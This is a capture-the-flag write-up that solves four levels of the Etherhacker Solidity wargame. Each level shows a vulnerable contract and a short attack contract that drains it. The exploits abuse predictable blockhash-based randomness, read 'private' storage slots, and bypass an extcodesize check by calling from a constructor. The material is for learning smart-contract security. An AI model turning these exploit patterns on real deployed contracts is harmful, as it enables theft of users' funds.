Title: Etherhacker wargame Lvl. 1-4
Date: 2019-1-14 10:01
Modified: 2019-1-14 10:01
Category: ctf
Tags: ctf, ethereum, solidity
Slug: Etherhacker_wargame
Authors: F3real
Summary: How to solve Etherhacker wargame lvl 1-4

Let's take a look at another interesting wargame based on solidity.
It can be found [here](https://etherhack.positive.com/#/)

[TOC]

## Azino 777

~~~solidity
pragma solidity ^0.4.16;

contract Azino777 {

  function spin(uint256 bet) public payable {
    require(msg.value >= 0.01 ether);
    uint256 num = rand(100);
    if(num == bet) {
        msg.sender.transfer(this.balance);
    }
  }

  //Generate random number between 0 & max
  uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;
  function rand(uint max) constant private returns (uint256 result){
    uint256 factor = FACTOR * 100 / max;
    uint256 lastBlockNumber = block.number - 1;
    uint256 hashVal = uint256(block.blockhash(lastBlockNumber));

    return uint256((uint256(hashVal) / factor)) % max;
  }

  function() public payable {}
}
~~~

We need to call `spin` function with correct bet. We see that it will be calculated based on `block.number - 1` in `random` function. To finish this challenge easily we just need to create contract with same random function. Transactions are going to execute in same block (and share same block variables) so both our contract and target will generate same random number.

We can convert address of contract to proper form from console using:
~~~javascript
web3.toChecksumAddress("<contract_instance>")
~~~

Solution:

~~~solidity
  ...
  Azino777 target = Azino777(targetAddress); 

  function attack() public payable {
    require(msg.value >= 0.01 ether);
    uint256 num = rand(100);
    target.spin.value(0.01 ether)(num);
  }
  ...
~~~

## Private Ryan

~~~solidity
pragma solidity ^0.4.16;

contract PrivateRyan {
  uint private seed = 1;

  function PrivateRyan() {
    seed = rand(256);
  }

  function spin(uint256 bet) public payable {
    require(msg.value >= 0.01 ether);
    uint256 num = rand(100);
    seed = rand(256);
    if(num == bet) {
        msg.sender.transfer(this.balance);
    }
  }

  //Generate random number between 0 & max
  uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;
  function rand(uint max) constant private returns (uint256 result){
    uint256 factor = FACTOR * 100 / max;
    uint256 blockNumber = block.number - seed;
    uint256 hashVal = uint256(block.blockhash(blockNumber));

    return uint256((uint256(hashVal) / factor)) % max;
  }

  function() public payable {}
}
~~~

Is almost the same challenge, but this time there is also random seed being used in calculating correct guess. We need to read it from contract storage before we create our contract to finish this challenge.

~~~javascript
web3.eth.getStorageAt(
  instanceAddress, 
  0,        //storage slot
  function (err, result) {
    console.log((web3.toHex(result))); 
  }
);
~~~

Solution:

~~~solidity
  PrivateRyan target = PrivateRyan(targetAddress);

  function attack(uint256 _seed) public payable {
    require(msg.value >= 0.01 ether);
    seed = _seed;
    uint256 num = rand(100);
    target.spin.value(0.01 ether)(num);
  }
~~~

## Wheel Of Fortune

~~~solidity
pragma solidity ^0.4.16;

contract WheelOfFortune {
  Game[] public games;

  struct Game {
      address player;
      uint id;
      uint bet;
      uint blockNumber;
  }

  function spin(uint256 _bet) public payable {
    require(msg.value >= 0.01 ether);
    uint gameId = games.length;
    games.length++;
    games[gameId].id = gameId;
    games[gameId].player = msg.sender;
    games[gameId].bet = _bet;
    games[gameId].blockNumber = block.number;
    if (gameId > 0) {
      uint lastGameId = gameId - 1;
      uint num = rand(block.blockhash(games[lastGameId].blockNumber), 100);
      if(num == games[lastGameId].bet) {
          games[lastGameId].player.transfer(this.balance);
      }
    }
  }

  function rand(bytes32 hash, uint max) pure private returns (uint256 result){
    return uint256(keccak256(hash)) % max;
  }

  function() public payable {}
}
~~~

This time `blockhash` is used as random number generator seed. We see that every new game entry checks if previous entry guess was correct.

The `blockhash` of current block, as a reminder, is always 0. 

We can abuse this fact since there is nothing stopping us simply calling this function twice in a row from our contract and triggering blockhash calculation for current block.

Other way would be abusing the fact that `blockhash` is saved only for last 256 blocks (older block number values will just return 0).

Solution:

~~~solidity
  ...
  WheelOfFortune target = WheelOfFortune(targetAddress);
  
  function attack(uint256 _bet) public payable {
    require(msg.value >= 0.02 ether);
    uint256 num  = rand(block.blockhash(block.number), 100);
    target.spin.value(0.01 ether)(num);
    target.spin.value(0.01 ether)(num);
  }
  ...
~~~

## Call Me Maybe

~~~solidity
contract CallMeMaybe {
    modifier CallMeMaybe() {
      uint32 size;
      address _addr = msg.sender;
      assembly {
        size := extcodesize(_addr)
      }
      if (size > 0) {
          revert();
      }
      _;
    }

    function HereIsMyNumber() CallMeMaybe {
        if(tx.origin == msg.sender) {
            revert();
        } else {
            msg.sender.transfer(this.balance);
        }
    }

    function() payable {}
}
~~~

We have two different checks to bypass, first we have modifier `CallMeMaybe` which checks if code size of `msg.sender` is greater then 0 and reverts. Second we have check that `tx.origin == msg.sender`.

Usually `tx.origin` is same as `msg.sender`, but if there are chained calls they will differ. For example if we have chain of calls A -> B -> C, for C, `msg.sender` will be address of B while `tx.origin` will be A.

To bypass these checks we will call target contract from constructor, since during contract initialization code size is 0. This will also bypass second check since we will have  `wallet -> attack contract -> target contract`.

~~~solidity
    CallMeMaybe target = CallMeMaybe(targetAddress);
    constructor() public {
        target.HereIsMyNumber();
    }    
~~~